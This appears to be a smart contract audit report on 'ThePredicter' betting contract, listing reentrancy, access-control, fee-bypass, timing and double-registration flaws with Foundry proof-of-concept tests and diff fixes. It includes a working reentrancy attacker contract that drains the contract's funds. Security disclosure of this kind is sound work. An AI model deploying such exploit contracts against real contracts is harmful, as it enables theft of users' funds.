# [H-1] `ThePredicter::cancelRegistration` can be reentered to drain the contract

## Summary

The CEI pattern is not followed in the `ThePredicter::cancelRegistration` function. This allows an attacker to reenter the function and withdraw the entrance fee multiple times.

## Vulnerability Details

The following code snippet demonstrates the reentrancy vulnerability in the `ThePredicter::cancelRegistration` function.
Paste the following proof of code into the `ThePredicter.test.sol` file:

Test:

```javascript
function testReenterCancelRegistration() public playersRegistered {
        ReentrancyPlayer attacker = new ReentrancyPlayer(thePredicter);
        vm.deal(address(attacker), thePredicter.entranceFee());
        // Register and reenter cancelRegistration
        attacker.registerAndCancel();
        assertEq(address(thePredicter).balance, 0);
        // The ReentrancyPlayer should have the entrance fee of all four players
        assertEq(address(attacker).balance, 4*thePredicter.entranceFee());
    }
```

Attacker contract:

```javascript
contract ReentrancyPlayer {
    ThePredicter public thePredicter;

    constructor(ThePredicter _thePredicter) {
        thePredicter = _thePredicter;
    }

    function registerAndCancel() public {
        thePredicter.register{value: 0.04 ether}();
        thePredicter.cancelRegistration();
    }

    receive() external payable {
        if (address(thePredicter).balance >= thePredicter.entranceFee()) {
            thePredicter.cancelRegistration();
        }
    }
}
```

## Impact

An attacker can drain all funds from the contract including the entrance and prediction fees.

## Tools Used

Manual review

## Recommendations

Follow the CEI pattern in the `ThePredicter::cancelRegistration` function to prevent reentrancy attacks.
To do so move the state change to the beginning of the function before the external call.

```diff
    function cancelRegistration() public {
        if (playersStatus[msg.sender] == Status.Pending) {
+           playersStatus[msg.sender] = Status.Canceled;
            (bool success, ) = msg.sender.call{value: entranceFee}("");
            require(success, "Failed to withdraw");
-           playersStatus[msg.sender] = Status.Canceled;
            return;
        }
        revert ThePredicter__NotEligibleForWithdraw();
    }
```

# [H-2] Missing access control allows anyone to set predictions for any player resulting in manipulation of the bet

## Summary

`ScoreBoard::setPrediction` has no access control, allowing anyone to pass in any address and set predictions for them. This can be used to manipulate the game by setting predictions for other players.

## Vulnerability Details

The following test demonstrates that anyone can set predictions for any player. The test should revert because the player is not the one who is setting the prediction.

Add the following test to the `ThePredicter.test.sol` file:

```javascript
    function testAnyoneCanSetPredictionsForAPlayer() public playerRegisteredAndApproved {
        address evilPlayer = makeAddr("evilPlayer");
        vm.prank(evilPlayer);
        // The evilPlayer sets the prediction for the stranger
        scoreBoard.setPrediction(stranger, 0, ScoreBoard.Result.First);
    }
```

## Impact

An attacker can set the predictions for other players to unlikely outcomes, reducing their chances of winning and thereby increasing their own profit.

## Tools Used

Manual review and unit testing.

## Recommendations

Add access control to only allow the predicter to set predictions for the player.

```diff
    function setPrediction(
        address player,
        uint256 matchNumber,
        Result result
-    ) public {
+    ) public onlyThePredicter {
        if (block.timestamp <= START_TIME + matchNumber * 68400 - 68400)
            playersPredictions[player].predictions[matchNumber] = result;
        playersPredictions[player].predictionsCount = 0;
        for (uint256 i = 0; i < NUM_MATCHES; ++i) {
            if (
                playersPredictions[player].predictions[i] != Result.Pending &&
                playersPredictions[player].isPaid[i]
            ) ++playersPredictions[player].predictionsCount;
        }
    }
```


# [M-1] Not-approved users can make predictions without paying entrance fees

## Summary

The `ThePredicter::makePrediction` allows player to make predictions. But it also allows strangers to make predictions without paying the entrance fee because the functions is missing a check if the player is approved.

## Vulnerability Details

The following test demonstrates that anyone can make predictions without registering first.
The test should revert because the player is not approved but it doesn't.

Add the following test to the `ThePredicter.test.sol` file:

```javascript
function testNotRegisteredPlayerCanMakePredictions() public {
        address notRegisteredPlayer = makeAddr("notRegisteredPlayer");
        hoax(notRegisteredPlayer);
        thePredicter.makePrediction{value: 0.0001 ether}(
            0,
            ScoreBoard.Result.First
        );
    }
```

## Impact

The prize fund that can be won consists of the collected entrance fees. When not-approved users make predictions they get a chance of winning the price fund without paying the entrance fee. If too many players abuse this vulnerability, the prize fund
will be very small.

## Tools Used

Manual review and unit testing.

## Recommendations

Before making a prediction add a check whether the player is approved.

```diff
+   error ThePredicter__PlayerNotApproved();
.
.
.
    function makePrediction(
        uint256 matchNumber,
        ScoreBoard.Result prediction
    ) public payable {
        if (msg.value != predictionFee) {
            revert ThePredicter__IncorrectPredictionFee();
        }
+       if (playersStatus[msg.sender] != Status.Approved) {
+           revert ThePredicter__PlayerNotApproved(); 
+       }
        if (block.timestamp > START_TIME + matchNumber * 68400 - 68400) {
            revert ThePredicter__PredictionsAreClosed();
        }

        scoreBoard.confirmPredictionPayment(msg.sender, matchNumber);
        scoreBoard.setPrediction(msg.sender, matchNumber, prediction);
    }
```

# [M-2] Predictions close earlier than expected leaving some players unable to make predictions

## Summary

According to the readme, predictions should close one hour before each game starts. The implementation does not match this description. The formula for calculating the closing time is incorrect. Here is the formula `block.timestamp > START_TIME + matchNumber * 68400 - 68400`. `68400` is 19 hours instead of the expected 1 hour which results in predictions closing 19 hours before the game starts i.e. at 1:00 AM instead of 7:00 PM. This formula is used in two functions `ThePredicter::makePrediction` and `ScoreBoard::setPrediction`.

Excerpt from the README.md:
> Every day from 20:00:00 UTC one match is played. Until 19:00:00 UTC on the day of the match, predictions can be made by any approved Player. Players pay prediction fee when making their first prediction for each match.


## Vulnerability Details
The test should pass because the prediction for the first game is placed exactly 1 hour before the match starts. 

Place the following test in the `ThePredicter.test.sol` file:

```javascript
    function testPredictionsCloseEarlierThanExpected() public {

        uint256 START_TIME = 1723752000; // Thu Aug 15 2024 20:00:00 GMT+0000

        // According to the readme, predictions close one hour before the tournament starts (for the first match)
        uint256 PREDICTIONS_CLOSE_TIME = START_TIME - 1 hours;

        hoax(stranger);
        thePredicter.register{value: 0.04 ether}();

        vm.prank(organizer);
        thePredicter.approvePlayer(stranger);

        // Set time to one hour before tournament start time: Thu Aug 15 2024 19:00:00 GMT+0000
        vm.warp(PREDICTIONS_CLOSE_TIME);

        vm.prank(stranger);
        // The call reverts despite the time being within the expected prediction time 
        thePredicter.makePrediction{value: 0.0001 ether}(
            0,
            ScoreBoard.Result.First
        );
    }
```

## Impact

Players placing their bets within 19 hours before the game starts will be unable to make predictions. Player's chances
of winning the tournament will be reduced when they cannot place bets.

## Tools Used

Manual review and unit testing.

## Recommendations

Remove the magic number a replace them with constants to make the closing time formula more readable.

```diff
+   uint256 public constant PREDICTION_CLOSE_TIME = 1 hours;
.
.
.
    function makePrediction(
        uint256 matchNumber,
        ScoreBoard.Result prediction
    ) public payable {
        if (msg.value != predictionFee) {
            revert ThePredicter__IncorrectPredictionFee();
        }
-       if (block.timestamp > START_TIME + matchNumber * 68400 - 68400) {
+       if (block.timestamp > START_TIME + matchNumber * PREDICTION_CLOSE_TIME - PREDICTION_CLOSE_TIME) {
            revert ThePredicter__PredictionsAreClosed();
        }

        scoreBoard.confirmPredictionPayment(msg.sender, matchNumber);
        scoreBoard.setPrediction(msg.sender, matchNumber, prediction);
    }
```




# [L-1] Users can enter the bet multiple times when they re-register after they have been approved to take other people's places in the bet

## Summary

Players enter the game by calling `ThePredicter::register` which sets their status to `Status.Pending`. `ThePredicter::register` checks whether the player already has a status of `Status.Pending` and denies registration if so. The organizer can approve the player by calling `ThePredicter::approvePlayer` which sets the player's status to `Status.Approved`. Because the player's status is now `Status.Approved`, the player can call `ThePredicter::register` again and enter the game multiple times, if the organizer does not check if the player is already entered. As stated in the readme, the organizer wants all his friends to participate in the game, which might not be possible if some players enter multiple times.

## Impact

The player can take up multiple slots in the game, increasing their chances of winning.

## Tools Used

Manual review

## Recommendations

Add a check in the register function if the player is already approved.


```diff
    function register() public payable {
        if (msg.value != entranceFee) {
            revert ThePredicter__IncorrectEntranceFee();
        }

        // 14400 == 4 hours
        if (block.timestamp > START_TIME - 14400) {
            revert ThePredicter__RegistrationIsOver();
        }


+       if (playersStatus[msg.sender] == Status.Pending || playersStatus[msg.sender] == Status.Approved) {
-       if (playersStatus[msg.sender] == Status.Pending) {
            revert ThePredicter__CannotParticipateTwice();
        }

        playersStatus[msg.sender] = Status.Pending;
    }
```

